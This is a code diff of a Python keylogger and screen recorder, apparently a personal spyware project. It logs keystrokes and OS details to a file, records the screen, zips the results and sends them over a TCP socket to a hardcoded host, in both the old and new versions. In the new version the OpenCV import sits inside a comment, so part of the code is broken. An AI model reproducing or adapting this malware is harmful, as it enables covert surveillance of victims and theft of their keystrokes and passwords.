@@ -1,47 +1,49 @@
-ser_add = "192.168.1.105"
-ser_port = 4444
+
+HOST= "192.168.1.101"
+PORT= 5555
 
             #modules needed
-import os
-import platform as plat
-from pynput import keyboard
-import numpy as np
-import cv2
-import pyautogui
-import threading
-import shutil
-import socket
-import tqdm
+from os import path, mkdir, remove
+from platform import system, release, architecture
+from time import sleep
+from pynput.keyboard import Listener
+from numpy import array#from cv2 import VideoWriter_fourcc, VideoWriter, cvtColor, destroyAllWindows, COLOR_BGR2RGB
+from pyautogui import size, screenshot
+from threading import Thread
+from shutil import make_archive
+from socket import socket, AF_INET, SOCK_STREAM
+from tqdm import tqdm
 
             #functions
 def keyboard_monitoring():
     #collect events (pressed keys)
-    with keyboard.Listener(on_press=savekey) as listener:
+    with Listener(on_press=savekey) as listener:
         listener.join()
 
 def record():
     while True:
-        screen_size = tuple(pyautogui.size())
-        fourcc = cv2.VideoWriter_fourcc(*"XVID")
+        screen_size = tuple(size())
+        fourcc = VideoWriter_fourcc(*"XVID")
         fps = 12
         video_file = "C:/Docs/vid.avi"
-        out = cv2.VideoWriter(video_file, fourcc, fps, screen_size)
-        time2rec = 20 
+        out = VideoWriter(video_file, fourcc, fps, screen_size)
+        time2rec = 20
         for i in range(int(time2rec * fps)):
-            img = pyautogui.screenshot()
+            img = screenshot()
             # convert these pixels to a proper numpy array to work with OpenCV
-            frame = np.array(img)
+            frame = array(img)
             # convert colors from BGR to RGB
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            frame = cvtColor(frame, COLOR_BGR2RGB)
             # write the frame
             out.write(frame)
-        cv2.destroyAllWindows()
+        destroyAllWindows()
         out.release()
-        shutil.make_archive("D:/Docs_z", 'zip', "C:/Docs")
-        keys_file = open("C:/Docs/keys.txt", "w").close()
-        os.remove("C:/Docs/vid.avi")
+        sleep(20)
+        make_archive("D:/Docs_z", 'zip', "C:/Docs")
+        info()
+        #remove("C:/Docs/vid.avi")
         send_Docs()
-        os.remove("D:/Docs_z.zip")
+        remove("D:/Docs_z.zip")
 
 def savekey(key):
     keys_file = open("C:/Docs/keys.txt", "a")
@@ -50,11 +52,11 @@ def savekey(key):
 
 def send_Docs():
     filename = "D:/Docs_z.zip"
-    filesize = os.path.getsize(filename)
+    filesize = path.getsize(filename)
     buffer_size = 4096
-    my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    my_sock.connect((ser_add, ser_port))     
-    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    my_sock = socket(AF_INET, SOCK_STREAM)
+    my_sock.connect((HOST, PORT))
+    progress = tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
     with open(filename, "rb") as f:
         while True:
             # read the bytes from the file
@@ -66,21 +68,21 @@ def send_Docs():
             progress.update(len(bytes_read))
     my_sock.close()
 
-            #1-Docs & info-gath
-#check if Docs exist if it doesn't creates it
-Docs_exist = os.path.isdir("C:/Docs")
-if Docs_exist == False:
-    os.mkdir("C:/Docs")
-#clear the content of keys.txt or create it if it doesn't exist 
-keys_file = open("C:/Docs/keys.txt", "w").close()
-#gather infos about the machine and append them to keys.txt
-os_info = "OS name: "+str(plat.system())+"   OS version: "+str(plat.release())+"  architecture: "+str(plat.architecture())
-keys_file = open("C:/Docs/keys.txt", "a")
-keys_file.write(os_info+"\n\n")
-keys_file.close()
+def info():
+    keys_file = open("C:/Docs/keys.txt", "w")
+    keys_file.write(os_info+"\n\n")
+    keys_file.close()
 
-            #2-start monitoring
-thread1 = threading.Thread(target=keyboard_monitoring)
-thread2 = threading.Thread(target=record)
+            #1-create if it doesn't exist Docs | clear keys.txt | info-gath
+Docs_exist = path.isdir("C:/Docs")
+if Docs_exist == False:
+    mkdir("C:/Docs")
+keys_file = open("C:/Docs/keys.txt", "w").close()
+os_info = "OS name: "+str(system())+"   OS version: "+str(release())+"  architecture: "+str(architecture())
+info()
+
+           #2-start monitoring
+thread1 = Thread(target=keyboard_monitoring)
+thread2 = Thread(target=record)
 thread1.start()
 thread2.start()
